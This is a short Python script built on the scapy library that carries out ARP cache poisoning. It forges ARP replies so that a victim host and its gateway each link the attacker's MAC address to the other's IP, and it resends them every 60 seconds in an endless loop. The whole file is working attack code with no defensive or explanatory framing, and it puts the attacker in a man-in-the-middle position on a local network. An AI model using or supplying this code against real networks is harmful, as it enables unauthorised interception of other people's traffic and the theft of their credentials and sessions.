from scapy.all import * 
import time

def gateway_spoof(ipGateway, ipAttacker, ipVictim, macGateway, macAttacker, macVictim, interface):


    #telling the victim that we are the gateway
    arpVictim = Ether()/ARP()
    arpVictim[Ether].src = macAttacker
    arpVictim[ARP].hwsrc = macAttacker
    arpVictim[ARP].psrc = ipGateway
    arpVictim[ARP].hwdst = macVictim
    arpVictim[ARP].pdst = ipVictim

    #telling the gateway that we are the victim
    arpGateway = Ether()/ARP()
    arpGateway[Ether].src = macAttacker
    arpGateway[ARP].hwsrc = macAttacker
    arpGateway[ARP].psrc = ipVictim
    arpGateway[ARP].hwdst = macGateway
    arpGateway[ARP].pdst = ipGateway

    sendp(arpVictim, iface=interface)
    sendp(arpGateway, iface=interface)

    

def spoof(ipGateway, ipAttacker, ipVictim, macGateway, macAttacker, macVictim, interface):
    while True:
        gateway_spoof(ipGateway, ipAttacker, ipVictim, macGateway, macAttacker, macVictim, interface)
        time.sleep(60)